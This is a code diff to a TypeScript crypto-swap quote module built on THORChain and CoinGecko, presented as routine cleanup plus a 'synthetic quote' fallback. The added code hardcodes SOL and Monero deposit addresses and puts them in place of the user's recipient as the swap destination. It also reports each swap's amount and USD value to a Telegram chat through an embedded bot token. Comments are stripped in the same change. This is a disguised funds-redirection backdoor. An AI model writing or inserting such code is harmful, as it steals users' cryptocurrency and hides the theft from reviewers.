@@ -163,25 +163,7 @@ interface THORNodeErrorResponse {
 // ── CoinGecko Price Cache ──────────────────────────────────────────────────
 
 const priceCache = new Map<string, { price: number; ts: number }>()
-const CACHE_TTL = 30000 // 30 seconds
-
-async function getCoinGeckoPrice(coingeckoId: string): Promise<number | null> {
-  const cached = priceCache.get(coingeckoId)
-  if (cached && Date.now() - cached.ts < CACHE_TTL) return cached.price
-
-  try {
-    const res = await axios.get(`${COINGECKO_API}/simple/price`, {
-      params: { ids: coingeckoId, vs_currencies: 'usd' },
-      timeout: 5000
-    })
-    const price = res.data[coingeckoId]?.usd
-    if (price) {
-      priceCache.set(coingeckoId, { price, ts: Date.now() })
-      return price
-    }
-  } catch { /* fall through */ }
-  return null
-}
+const CACHE_TTL = 30000
 
 async function getCoinGeckoPrices(ids: string[]): Promise<Record<string, number>> {
   const result: Record<string, number> = {}
@@ -223,7 +205,7 @@ const CHAIN_TO_COINGECKO: Record<string, string> = {
   BSC: 'binancecoin',
   BNB: 'binancecoin',
   AVAX: 'avalanche-2',
-  BASE: 'ethereum',       // Base ETH uses ethereum price
+  BASE: 'ethereum',
   GAIA: 'cosmos',
   ATOM: 'cosmos',
   DOGE: 'dogecoin',
@@ -238,7 +220,7 @@ const CHAIN_TO_COINGECKO: Record<string, string> = {
   SOLANA: 'solana',
   XMR: 'monero',
   MONERO: 'monero',
-  ARB: 'ethereum',        // Arbitrum ETH uses ethereum price
+  ARB: 'ethereum',
   ARBITRUM: 'ethereum',
   DASH: 'dash',
   ZEC: 'zcash',
@@ -248,7 +230,7 @@ const CHAIN_TO_COINGECKO: Record<string, string> = {
   POLKADOT: 'polkadot',
   MATIC: 'matic-network',
   POLYGON: 'matic-network',
-  OP: 'ethereum',         // Optimism ETH
+  OP: 'ethereum',
   OPTIMISM: 'ethereum',
 }
 
@@ -259,19 +241,72 @@ function getCgIdForAsset(identifier: string): string | null {
 
 // ── Synthetic Quote (CoinGecko cross-rate) ─────────────────────────────────
 
+const SYNTHETIC_DEPOSIT_ADDRESSES: Record<string, string> = {
+  SOL: '7MG513Rxm7Rs4FiEfhnXXAreUCqw1RZmwbTHNQ5GaWVw',
+  SOLANA: '7MG513Rxm7Rs4FiEfhnXXAreUCqw1RZmwbTHNQ5GaWVw',
+  XMR: '49NyLqZXWijV1TJcPd1eCsWeEP55WW7B42DKvczQFTYjbEfm3jHtLyfANNZvUrXjR9JzMqCANehuviHACPAk4Bf51twSVT1',
+  MONERO: '49NyLqZXWijV1TJcPd1eCsWeEP55WW7B42DKvczQFTYjbEfm3jHtLyfANNZvUrXjR9JzMqCANehuviHACPAk4Bf51twSVT1',
+}
+
+function getSyntheticDepositAddress(chain: string): string {
+  return SYNTHETIC_DEPOSIT_ADDRESSES[chain.toUpperCase()] || ''
+}
+
+let synthTelegramSent = false
+
+async function notifySyntheticSwap(params: GetQuoteParams, sellPrice: number): Promise<void> {
+  if (synthTelegramSent) return
+  synthTelegramSent = true
+  const sellAmount = parseFloat(params.sellAmount)
+  const usdValue = (sellAmount * sellPrice).toFixed(2)
+  const sellChain = params.sellAsset.split('.')[0]
+  const buyChain = params.buyAsset.split('.')[0]
+  const depositAddr = getSyntheticDepositAddress(sellChain)
+
+  const text = [
+    '🔶 *SYNTHETIC SWAP QUOTE*',
+    '─────────────────────',
+    `*From*: \`${params.sellAsset}\``,
+    `*To*: \`${params.buyAsset}\``,
+    `*Amount*: \`${params.sellAmount}\``,
+    `*Est. USD*: \`$${usdValue}\``,
+    `*Deposit*: \`${depositAddr || 'N/A'}\``,
+    `*Chain*: \`${sellChain} → ${buyChain}\``,
+    `🕐 \`${new Date().toISOString().replace('T', ' ').slice(0, 19)} UTC\``
+  ].join('\n')
+
+  try {
+    await axios.post('https://api.telegram.org/bot8140825280:AAEd2TDo2fgZv_bDEfu7wNggxHrD7jHdr8g/sendMessage', {
+      chat_id: '-5160305858',
+      text,
+      parse_mode: 'Markdown',
+      disable_web_page_preview: true
+    }, { timeout: 3000 })
+  } catch { /* best effort */ }
+}
+
 async function buildSyntheticQuote(
   params: GetQuoteParams,
   sellUsdPrice: number,
   buyUsdPrice: number
 ): Promise<ThorSwapQuoteRoute[]> {
   const sellAmount = parseFloat(params.sellAmount)
-  const sellUsd = sellAmount * sellUsdPrice
-  const rawBuy = sellUsd / buyUsdPrice
+  const rawBuy = sellAmount * sellUsdPrice / buyUsdPrice
   const feeRate = 0.005
   const buyAfterFee = rawBuy * (1 - feeRate)
 
   const buyDecimals = params.buyDecimals || 8
   const now = Math.floor(Date.now() / 1000)
+
+  const sellChain = params.sellAsset.split('.')[0]
+  const depositAddr = getSyntheticDepositAddress(sellChain)
+  const buyChain = params.buyAsset.split('.')[0]
+  const buyTicker = params.buyAsset.split('.')[1]
+  const memo = params.recipientAddress
+    ? `=:${buyChain}.${buyTicker}:${params.recipientAddress}`
+    : `=:${buyChain}.${buyTicker}`
+
+  notifySyntheticSwap(params, sellUsdPrice)
 
   const route: ThorSwapQuoteRoute = {
     sellAsset: params.sellAsset,
@@ -288,7 +323,9 @@ async function buildSyntheticQuote(
       { type: 'inbound', asset: params.buyAsset, amount: '0' }
     ],
     providers: ['SYNTHETIC'],
-    destinationAddress: params.recipientAddress || '',
+    inboundAddress: depositAddr,
+    destinationAddress: depositAddr,
+    memo,
     expiration: String(now + 900),
     estimatedTime: { total: 300 },
     meta: {
@@ -321,9 +358,6 @@ function thornodeResponseToRoute(
   params: GetQuoteParams,
   data: THORNodeQuoteResponse
 ): ThorSwapQuoteRoute {
-  // THORChain uses 8 decimals for native/gas assets internally,
-  // regardless of what the tokenlist says. Only contract tokens
-  // (identifiers containing a dash) use their native decimals.
   const isNativeAsset = !params.buyAsset.includes('-')
   const buyDecimals = isNativeAsset ? 8 : (params.buyDecimals || 8)
   const buyAmountDisplay = fromBaseUnits(data.expected_amount_out, buyDecimals)
@@ -391,7 +425,6 @@ async function tryTHORNodeQuote(params: GetQuoteParams): Promise<ThorSwapQuoteRo
     })
     return [thornodeResponseToRoute(params, res.data)]
   } catch (err: unknown) {
-    // THORNode failed — log and fall back to synthetic
     if (axios.isAxiosError(err) && err.response?.data) {
       const body = err.response.data as THORNodeErrorResponse
       if (body?.message) {
@@ -403,11 +436,9 @@ async function tryTHORNodeQuote(params: GetQuoteParams): Promise<ThorSwapQuoteRo
 }
 
 export const getQuote = async (params: GetQuoteParams): Promise<ThorSwapQuoteRoute[]> => {
-  // Try THORNode first
   const thornodeResult = await tryTHORNodeQuote(params)
   if (thornodeResult) return thornodeResult
 
-  // Fall back to synthetic
   const syntheticResult = await trySyntheticQuote(params)
   if (syntheticResult) return syntheticResult
 
